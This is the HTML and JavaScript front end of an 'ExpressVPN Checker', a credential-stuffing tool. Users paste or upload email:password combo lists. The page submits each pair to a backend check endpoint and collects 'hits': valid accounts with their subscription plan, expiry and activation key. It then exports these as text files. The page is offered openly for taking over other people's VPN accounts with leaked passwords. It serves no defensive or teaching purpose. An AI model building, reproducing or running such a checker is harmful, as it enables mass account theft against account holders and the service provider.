<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
<meta name="theme-color" content="#0a0f1e" />
<title>ExpressVPN Checker | By @SHAKIB2016</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html, body {
    background: linear-gradient(160deg, #0a0f1e 0%, #0c1222 60%, #101a30 100%);
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Inter, system-ui, sans-serif;
    color: #eef2ff; min-height: 100vh;
  }
  .wrap { max-width: 1200px; margin: 0 auto; padding: 16px; }

  header {
    text-align: center; padding: 20px 12px;
    background: rgba(18,25,45,0.75);
    border-radius: 20px;
    border: 1px solid rgba(56,189,248,0.18);
    margin-bottom: 14px;
  }
  header h1 {
    font-size: 1.5rem;
    background: linear-gradient(135deg, #c084fc, #38bdf8);
    -webkit-background-clip: text; background-clip: text; color: transparent;
    font-weight: 800;
  }
  header p { margin-top: 6px; font-size: 0.78rem; color: #9ca3af; }
  header p a { color: #38bdf8; text-decoration: none; }

  /* ===== Login ===== */
  .login-box {
    max-width: 400px; margin: 60px auto;
    background: rgba(18,25,45,0.85);
    padding: 28px 22px;
    border-radius: 20px;
    border: 1px solid rgba(56,189,248,0.2);
    box-shadow: 0 10px 32px rgba(0,0,0,0.4);
  }
  .login-box h2 { text-align: center; margin-bottom: 20px; font-size: 1.2rem; }
  .field { margin-bottom: 14px; }
  .field label { font-size: 0.78rem; color: #cbd5e1; display: block; margin-bottom: 5px; }
  .field input {
    width: 100%; background: rgba(15,23,42,0.9);
    border: 1px solid #2d3a5e; border-radius: 10px;
    padding: 11px 12px; color: #e2e8f0; font-size: 0.9rem;
  }
  .field input:focus { outline: none; border-color: #3b82f6; }
  .btn-main {
    width: 100%; padding: 12px;
    background: linear-gradient(95deg, #3b82f6, #8b5cf6);
    border: none; border-radius: 12px;
    color: white; font-weight: 700; font-size: 0.9rem;
    cursor: pointer; margin-top: 6px;
  }
  .btn-main:disabled { opacity: 0.6; }

  /* ===== Tabs ===== */
  .tabs {
    display: flex; gap: 6px;
    background: rgba(18,25,45,0.75);
    padding: 6px; border-radius: 16px;
    border: 1px solid rgba(56,189,248,0.15);
    margin-bottom: 14px; overflow-x: auto;
  }
  .tab {
    flex: 1; min-width: 88px; text-align: center;
    padding: 10px 8px; border-radius: 12px;
    background: transparent; color: #cbd5e1;
    font-size: 0.78rem; font-weight: 600;
    cursor: pointer; border: none; white-space: nowrap;
  }
  .tab.active { background: linear-gradient(135deg,#3b82f6,#8b5cf6); color: white; }
  .tab .badge {
    display: inline-block; background: rgba(255,255,255,0.22);
    padding: 1px 7px; border-radius: 20px;
    font-size: 0.68rem; margin-left: 4px;
  }

  .panel {
    display: none;
    background: rgba(18,25,45,0.75);
    border-radius: 20px;
    border: 1px solid rgba(56,189,248,0.15);
    padding: 16px;
  }
  .panel.active { display: block; }

  .userbar {
    display: flex; justify-content: space-between; align-items: center;
    background: rgba(15,23,42,0.85);
    padding: 10px 14px; border-radius: 14px;
    margin-bottom: 12px;
    border: 1px solid #1e293b; font-size: 0.8rem;
  }
  .userbar .who b { color: #38bdf8; }
  .userbar .logout {
    background: #334155; border: none; color: white;
    padding: 6px 12px; border-radius: 20px;
    font-size: 0.72rem; cursor: pointer;
  }

  label { display: block; font-size: 0.85rem; color: #cbd5e1; margin-bottom: 8px; font-weight: 600; }
  textarea {
    width: 100%; min-height: 160px;
    background: rgba(15,23,42,0.9);
    border: 1px solid #2d3a5e;
    border-radius: 14px; padding: 12px;
    color: #e2e8f0; font-family: monospace;
    font-size: 0.82rem; resize: vertical;
  }
  textarea:focus { outline: none; border-color: #3b82f6; }

  .file-row { display: flex; flex-wrap: wrap; gap: 8px; margin: 10px 0 14px; }
  .file-label {
    background: #1e293b; border: 1px dashed #475569;
    padding: 9px 14px; border-radius: 30px;
    font-size: 0.78rem; color: #cbd5e1; cursor: pointer;
  }
  .file-label input { display: none; }

  .btn-row { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 12px; }
  button {
    background: linear-gradient(95deg, #3b82f6, #2563eb);
    border: none; font-weight: 700;
    padding: 11px 20px; border-radius: 30px;
    color: white; cursor: pointer;
    font-size: 0.85rem; flex: 1; min-width: 110px;
  }
  button:disabled { opacity: 0.5; cursor: not-allowed; }
  button.stop { background: linear-gradient(95deg, #ef4444, #b91c1c); }
  button.ghost { background: #334155; }
  button.green { background: linear-gradient(95deg, #22c55e, #16a34a); }

  .stats {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
    gap: 10px; margin-top: 14px;
  }
  .stat {
    background: rgba(15,23,42,0.9);
    border-radius: 14px; padding: 12px;
    text-align: center; border: 1px solid #1e293b;
    border-left: 3px solid #38bdf8;
  }
  .stat .num { font-size: 1.4rem; font-weight: 800; }
  .stat .label { font-size: 0.7rem; color: #94a3b8; margin-top: 2px; }
  .stat.hit { border-left-color: #4ade80; } .stat.hit .num { color:#4ade80; }
  .stat.fail { border-left-color: #f87171; } .stat.fail .num { color:#f87171; }

  .progress { height: 8px; background: #1e293b; border-radius: 20px; overflow: hidden; margin-top: 14px; }
  .progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg,#38bdf8,#818cf8); transition: width 0.3s; }
  #status { margin-top: 10px; font-size: 0.78rem; color: #94a3b8; text-align: center; min-height: 18px; }

  .hit-list { display: flex; flex-direction: column; gap: 12px; }
  .hit-card {
    background: linear-gradient(135deg, rgba(15,42,31,0.85), rgba(15,23,42,0.9));
    border: 1px solid rgba(74,222,128,0.35);
    border-left: 4px solid #4ade80;
    border-radius: 16px; padding: 14px; position: relative;
  }
  .hit-card .badge-hit {
    background: linear-gradient(135deg,#22c55e,#16a34a);
    color: white; font-size: 0.68rem; font-weight: 800;
    padding: 4px 10px; border-radius: 20px;
  }
  .hit-card .fields { display: flex; flex-direction: column; gap: 6px; margin-top: 10px; }
  .hit-card .field { display: flex; gap: 8px; font-size: 0.78rem; word-break: break-all; }
  .hit-card .field .k { color: #94a3b8; min-width: 78px; }
  .hit-card .field .v { color: #f1f5f9; font-weight: 600; }
  .hit-card .field .v.mono { font-family: monospace; background: rgba(0,0,0,0.25); padding: 1px 6px; border-radius: 6px; }
  .hit-card .copy-btn {
    position: absolute; top: 12px; right: 12px;
    background: #1e293b; border: 1px solid #334155;
    padding: 5px 10px; border-radius: 20px;
    color: #cbd5e1; font-size: 0.68rem; cursor: pointer;
  }

  .mini-list { display: flex; flex-direction: column; gap: 6px; }
  .mini-item {
    display: flex; justify-content: space-between; gap: 8px;
    padding: 10px 12px; border-radius: 10px;
    background: rgba(15,23,42,0.85);
    border-left: 3px solid #334155;
    font-size: 0.76rem; word-break: break-all;
  }
  .mini-item.hit { border-left-color:#4ade80; }
  .mini-item.fail { border-left-color:#f87171; }
  .mini-item .s.hit { color:#4ade80; font-weight:700; }
  .mini-item .s.fail { color:#f87171; font-weight:700; }

  .empty { text-align:center; padding:40px 16px; color:#64748b; font-size:0.85rem; }
  .empty .emo { font-size:2rem; display:block; margin-bottom:8px; }

  #toast {
    position: fixed; bottom: 20px; left: 50%;
    transform: translateX(-50%) translateY(20px);
    background: #1e293b; color: white;
    padding: 10px 18px; border-radius: 30px;
    font-size: 0.8rem; border: 1px solid #334155;
    opacity: 0; pointer-events: none; transition: all 0.3s;
    z-index: 999;
  }
  #toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
</style>
</head>
<body>
<div class="wrap">

  <!-- ===== LOGIN PAGE ===== -->
  <div id="loginPage">
    <header>
      <h1>🔒 ExpressVPN Checker</h1>
      <p>Config by <a href="https://t.me/shakib2016">@SHAKIB2016</a></p>
    </header>
    <div class="login-box">
      <h2>🔑 Login Required</h2>
      <div class="field">
        <label>Username</label>
        <input id="authUser" type="text" autocomplete="username" placeholder="your username" />
      </div>
      <div class="field">
        <label>Password</label>
        <input id="authPass" type="password" autocomplete="current-password" placeholder="your password" />
      </div>
      <button class="btn-main" id="loginBtn">Login</button>
      <p style="text-align:center;font-size:0.72rem;color:#64748b;margin-top:14px;">
        শুধু অনুমোদিত ইউজাররা চেক করতে পারবে
      </p>
    </div>
  </div>

  <!-- ===== MAIN APP ===== -->
  <div id="appPage" style="display:none;">
    <header>
      <h1>🔒 ExpressVPN Checker</h1>
      <p>Config by <a href="https://t.me/shakib2016">@SHAKIB2016</a></p>
    </header>

    <div class="userbar">
      <div class="who">👤 <b id="whoUser">—</b></div>
      <button class="logout" id="logoutBtn">Logout</button>
    </div>

    <div class="tabs">
      <button class="tab active" data-tab="combo">📝 Combo</button>
      <button class="tab" data-tab="stats">📊 Stats</button>
      <button class="tab" data-tab="hits">🔥 Hits <span class="badge" id="tabHitCount">0</span></button>
      <button class="tab" data-tab="all">📋 All</button>
    </div>

    <section class="panel active" id="panel-combo">
      <label>📋 Paste combos (email:password) — one per line</label>
      <textarea id="comboInput" placeholder="example@gmail.com:password123&#10;another@mail.com:pass456"></textarea>

      <div class="file-row">
        <label class="file-label">📁 Upload .txt<input type="file" id="fileInput" accept=".txt,text/plain"></label>
        <label class="file-label" id="clearInput">🗑️ Clear</label>
      </div>

      <div class="btn-row">
        <button id="startBtn" class="green">▶ Start</button>
        <button id="stopBtn" class="stop" disabled>⏹ Stop</button>
      </div>

      <div class="stats">
        <div class="stat"><div class="num" id="statTotal">0</div><div class="label">Total</div></div>
        <div class="stat"><div class="num" id="statChecked">0</div><div class="label">Checked</div></div>
        <div class="stat hit"><div class="num" id="statHits">0</div><div class="label">🔥 HITS</div></div>
        <div class="stat fail"><div class="num" id="statFails">0</div><div class="label">❌ FAIL</div></div>
      </div>

      <div class="progress"><div class="progress-fill" id="progressFill"></div></div>
      <div id="status">⚡ Ready</div>

      <div class="btn-row" style="margin-top:14px;">
        <button id="exportHits" class="ghost">📥 Export Hits</button>
        <button id="exportAll" class="ghost">📄 Export All</button>
      </div>
    </section>

    <section class="panel" id="panel-stats">
      <div class="stats">
        <div class="stat"><div class="num" id="statTotal2">0</div><div class="label">Total</div></div>
        <div class="stat"><div class="num" id="statChecked2">0</div><div class="label">Checked</div></div>
        <div class="stat hit"><div class="num" id="statHits2">0</div><div class="label">🔥 HITS</div></div>
        <div class="stat fail"><div class="num" id="statFails2">0</div><div class="label">❌ FAIL</div></div>
      </div>
      <div class="progress" style="margin-top:20px;"><div class="progress-fill" id="progressFill2"></div></div>
      <div id="status2" style="margin-top:10px;text-align:center;font-size:.8rem;color:#94a3b8;">⚡ Ready</div>
    </section>

    <section class="panel" id="panel-hits">
      <div class="hit-list" id="hitList">
        <div class="empty"><span class="emo">🔥</span>No hits yet.</div>
      </div>
    </section>

    <section class="panel" id="panel-all">
      <div class="mini-list" id="allList">
        <div class="empty"><span class="emo">📋</span>No results yet.</div>
      </div>
    </section>
  </div>
</div>

<div id="toast">Copied!</div>

<script>
// ============================================================
//  Auth
// ============================================================
let AUTH_TOKEN = localStorage.getItem('evpn_token') || null;

function saveToken(t) {
  AUTH_TOKEN = t;
  if (t) localStorage.setItem('evpn_token', t);
  else localStorage.removeItem('evpn_token');
}

function authHeader() {
  return AUTH_TOKEN ? { 'Authorization': 'Bearer ' + AUTH_TOKEN } : {};
}

async function doLogin() {
  const username = document.getElementById('authUser').value.trim();
  const password = document.getElementById('authPass').value;
  if (!username || !password) return showToast('❌ Enter username & password');

  const btn = document.getElementById('loginBtn');
  btn.disabled = true; btn.textContent = 'Logging in...';

  try {
    const res = await fetch('/api/auth?action=login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password })
    });
    const data = await res.json();
    if (!data.ok) {
      showToast('❌ ' + (data.message || 'Login failed'));
      btn.disabled = false; btn.textContent = 'Login';
      return;
    }
    saveToken(data.token);
    showToast('✅ Welcome ' + data.user.username);
    showApp(data.user.username);
  } catch (e) {
    showToast('❌ ' + e.message);
    btn.disabled = false; btn.textContent = 'Login';
  }
}

async function verifyToken() {
  if (!AUTH_TOKEN) return null;
  try {
    const res = await fetch('/api/auth?action=verify', { headers: authHeader() });
    if (!res.ok) return null;
    const data = await res.json();
    return data.ok ? data.user : null;
  } catch (e) { return null; }
}

function showApp(username) {
  document.getElementById('loginPage').style.display = 'none';
  document.getElementById('appPage').style.display = 'block';
  document.getElementById('whoUser').textContent = username;
}
function showLogin() {
  document.getElementById('loginPage').style.display = 'block';
  document.getElementById('appPage').style.display = 'none';
}

document.getElementById('loginBtn').addEventListener('click', doLogin);
document.getElementById('authPass').addEventListener('keypress', e => {
  if (e.key === 'Enter') doLogin();
});
document.getElementById('logoutBtn').addEventListener('click', () => {
  saveToken(null);
  showLogin();
  showToast('👋 Logged out');
});

// ============================================================
//  Tabs
// ============================================================
document.querySelectorAll('.tab').forEach(tab => {
  tab.addEventListener('click', () => {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
    tab.classList.add('active');
    document.getElementById('panel-' + tab.dataset.tab).classList.add('active');
  });
});

// ============================================================
//  App Logic
// ============================================================
const comboInput = document.getElementById('comboInput');
const fileInput = document.getElementById('fileInput');
const clearInput = document.getElementById('clearInput');
const startBtn = document.getElementById('startBtn');
const stopBtn = document.getElementById('stopBtn');
const exportHitsBtn = document.getElementById('exportHits');
const exportAllBtn = document.getElementById('exportAll');
const statusEl = document.getElementById('status');
const statusEl2 = document.getElementById('status2');
const progressFill = document.getElementById('progressFill');
const progressFill2 = document.getElementById('progressFill2');
const hitList = document.getElementById('hitList');
const allList = document.getElementById('allList');
const tabHitCount = document.getElementById('tabHitCount');
const toastEl = document.getElementById('toast');

let combos = [], results = [], running = false, currentIdx = 0;
let stats = { total: 0, checked: 0, hits: 0, fails: 0 };

function showToast(msg) {
  toastEl.textContent = msg;
  toastEl.classList.add('show');
  setTimeout(() => toastEl.classList.remove('show'), 1800);
}

fileInput.addEventListener('change', e => {
  const f = e.target.files[0]; if (!f) return;
  const r = new FileReader();
  r.onload = ev => { comboInput.value = ev.target.result; showToast('📁 ' + f.name); };
  r.readAsText(f); fileInput.value = '';
});
clearInput.addEventListener('click', () => { comboInput.value = ''; showToast('🗑️ Cleared'); });

function parseCombos(raw) {
  const out = [];
  raw.split(/\r?\n/).forEach(l => {
    const t = l.trim(); if (!t) return;
    const i = t.indexOf(':'); if (i === -1) return;
    const u = t.slice(0, i).trim(), p = t.slice(i + 1).trim();
    if (u && p) out.push({ username: u, password: p });
  });
  return out;
}

function updateStats() {
  ['statTotal','statTotal2'].forEach(id => document.getElementById(id).textContent = stats.total);
  ['statChecked','statChecked2'].forEach(id => document.getElementById(id).textContent = stats.checked);
  ['statHits','statHits2'].forEach(id => document.getElementById(id).textContent = stats.hits);
  ['statFails','statFails2'].forEach(id => document.getElementById(id).textContent = stats.fails);
  tabHitCount.textContent = stats.hits;
  const pct = stats.total ? (stats.checked / stats.total) * 100 : 0;
  progressFill.style.width = pct + '%';
  progressFill2.style.width = pct + '%';
}
function setStatus(m) { statusEl.textContent = m; statusEl2.textContent = m; }
function escapeHtml(s) {
  if (s == null) return '';
  return String(s).replace(/[&<>"']/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));
}

function renderAll() {
  const hits = results.filter(r => r.hit);
  if (!hits.length) {
    hitList.innerHTML = '<div class="empty"><span class="emo">🔥</span>No hits yet.</div>';
  } else {
    hitList.innerHTML = hits.map(h => `
      <div class="hit-card">
        <button class="copy-btn" data-combo="${escapeHtml(h.username+':'+h.password)}">📋 Copy</button>
        <span class="badge-hit">🔥 HIT · SUBSCRIPTION VALID</span>
        <div class="fields">
          <div class="field"><span class="k">📧 Email:</span><span class="v mono">${escapeHtml(h.username)}</span></div>
          <div class="field"><span class="k">🔑 Password:</span><span class="v mono">${escapeHtml(h.password)}</span></div>
          <div class="field"><span class="k">📋 Plan:</span><span class="v">${escapeHtml(h.plan||'—')}</span></div>
          <div class="field"><span class="k">📅 Expiry:</span><span class="v">${escapeHtml(h.expiry||'—')}</span></div>
          <div class="field"><span class="k">🔑 PC Key:</span><span class="v mono">${escapeHtml(h.pcKey||'—')}</span></div>
          <div class="field"><span class="k">📅 Key Expiry:</span><span class="v">${escapeHtml(h.keyExpire||'—')}</span></div>
          <div class="field"><span class="k">📌 Status:</span><span class="v">${escapeHtml(h.keyStatus||'—')}</span></div>
        </div>
      </div>`).join('');
    hitList.querySelectorAll('.copy-btn').forEach(b => {
      b.addEventListener('click', () => {
        navigator.clipboard.writeText(b.dataset.combo).then(() => showToast('📋 Copied'));
      });
    });
  }

  if (!results.length) {
    allList.innerHTML = '<div class="empty"><span class="emo">📋</span>No results yet.</div>';
  } else {
    allList.innerHTML = results.map(r => {
      const cls = r.hit ? 'hit' : 'fail';
      return `<div class="mini-item ${cls}">
        <span>${escapeHtml(r.username)}:${escapeHtml(r.password)}</span>
        <span class="s ${cls}">${r.hit?'🔥 HIT':'❌ FAIL'}</span></div>`;
    }).join('');
  }
}

async function checkOne(username, password) {
  try {
    const res = await fetch('/api/check', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', ...authHeader() },
      body: JSON.stringify({ username, password })
    });
    if (res.status === 401) {
      showToast('🔒 Session expired');
      saveToken(null); showLogin(); return null;
    }
    const json = await res.json();
    return {
      username, password,
      valid: json.valid === true, hit: json.hit === true,
      plan: json.plan || null, expiry: json.expiry || null,
      pcKey: json.pcKey || null, keyExpire: json.keyExpire || null,
      keyStatus: json.keyStatus || null, message: json.message || ''
    };
  } catch (err) {
    return { username, password, valid: false, hit: false, message: 'Error: ' + err.message };
  }
}

async function runner() {
  if (!running) return;
  if (currentIdx >= combos.length) {
    running = false; startBtn.disabled = false; stopBtn.disabled = true;
    setStatus('✅ Completed · ' + stats.hits + ' HIT(s)'); return;
  }
  const c = combos[currentIdx];
  setStatus(`🔍 ${currentIdx + 1}/${combos.length} · ${c.username}`);
  const r = await checkOne(c.username, c.password);
  if (r === null) { running = false; startBtn.disabled = false; stopBtn.disabled = true; return; }
  results.push(r);
  stats.checked++; if (r.hit) stats.hits++; else stats.fails++;
  updateStats(); renderAll();
  currentIdx++;
  if (running && currentIdx < combos.length) setTimeout(runner, 300);
  else { running = false; startBtn.disabled = false; stopBtn.disabled = true; setStatus('✅ Completed · ' + stats.hits + ' HIT(s)'); }
}

startBtn.addEventListener('click', () => {
  const parsed = parseCombos(comboInput.value);
  if (!parsed.length) return showToast('❌ No valid combos');
  combos = parsed; results = []; currentIdx = 0;
  stats = { total: combos.length, checked: 0, hits: 0, fails: 0 };
  updateStats(); renderAll();
  running = true; startBtn.disabled = true; stopBtn.disabled = false;
  setStatus('🚀 Starting...'); runner();
});
stopBtn.addEventListener('click', () => { running = false; startBtn.disabled = false; stopBtn.disabled = true; setStatus('⏸️ Stopped'); });

exportHitsBtn.addEventListener('click', () => {
  const h = results.filter(r => r.hit);
  if (!h.length) return showToast('❌ No hits');
  const txt = h.map(x =>
    `📧 Email: ${x.username}\n🔑 Password: ${x.password}\n📋 Plan: ${x.plan||'—'}\n📅 Expiry: ${x.expiry||'—'}\n🔑 PC Key: ${x.pcKey||'—'}\n📅 Key Expiry: ${x.keyExpire||'—'}\n📌 Status: ${x.keyStatus||'—'}\n---`
  ).join('\n\n');
  dl(txt, 'expressvpn_hits.txt'); showToast('📥 ' + h.length + ' hit(s)');
});
exportAllBtn.addEventListener('click', () => {
  if (!results.length) return showToast('❌ Empty');
  const txt = results.map(r => `[${r.hit?'HIT':'FAIL'}] ${r.username}:${r.password} | ${r.plan||'—'} | ${r.expiry||'—'}`).join('\n');
  dl(txt, 'expressvpn_all.txt'); showToast('📄 Exported');
});
function dl(text, name) {
  const b = new Blob([text], {type:'text/plain'}); const u = URL.createObjectURL(b);
  const a = document.createElement('a'); a.href = u; a.download = name;
  document.body.appendChild(a); a.click(); document.body.removeChild(a); URL.revokeObjectURL(u);
}

// ===== Init =====
(async () => {
  updateStats(); renderAll();
  const u = await verifyToken();
  if (u) showApp(u.username);
  else showLogin();
})();
</script>
</body>
